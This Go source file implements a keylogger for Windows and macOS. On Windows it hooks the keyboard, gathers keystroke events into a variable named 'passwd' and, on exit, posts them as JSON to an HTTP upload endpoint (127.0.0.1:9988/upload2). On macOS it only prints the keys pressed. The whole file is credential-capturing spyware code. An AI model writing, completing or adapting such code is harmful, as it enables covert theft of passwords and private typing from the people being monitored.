package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"time"

	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	machook "github.com/robotn/gohook"
)

func main() {
	osInfo := runtime.GOOS
	switch osInfo {
	case "windows":
		{
			log.SetFlags(0)
			log.SetPrefix("error:")
			if err := run_win(); err != nil {
				log.Fatal(err)
			}
		}
	case "darwin":
		{
			log.SetFlags(0)
			log.SetPrefix("error:")
			if err := run_mac(); err != nil {
				log.Fatal(err)
			}
		}
	}

}
func run_win() error {
	passwd := ""
	keyboard_chan := make(chan types.KeyboardEvent, 100)
	if err := keyboard.Install(nil, keyboard_chan); err != nil {
		return err
	}

	defer func() {
		keyboard.Uninstall()
		fmt.Println(passwd)
		payload := map[string]string{"content": passwd}
		json_data, _ := json.Marshal(payload)
		response, err := http.Post("http://127.0.0.1:9988/upload2", "application/json", bytes.NewReader(json_data))
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(response)
		}
	}()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	fmt.Println("开始监听键盘（按 Ctrl+C 退出）")
	for {
		select {
		case <-time.After(5 * time.Minute):
			fmt.Println("no input listened")
		case <-signalChan:
			fmt.Println("退出监听")
			return nil
		case k := <-keyboard_chan:
			fmt.Printf("按下了:%v %v", k.Message.String(), k.VKCode)
			passwd += k.Message.String() + ";"
			continue
		}
	}
	//unreachable
	//return nil
}
func run_mac() error {
	ch := machook.Start()
	defer machook.End()

	for ev := range ch {
		if ev.Kind == machook.KeyDown {
			fmt.Printf("pressing:%v\n", ev.Keychar)
		}
		if ev.Keychar == 27 {
			//esc is pressed
			break
		}
	}
	return nil
}
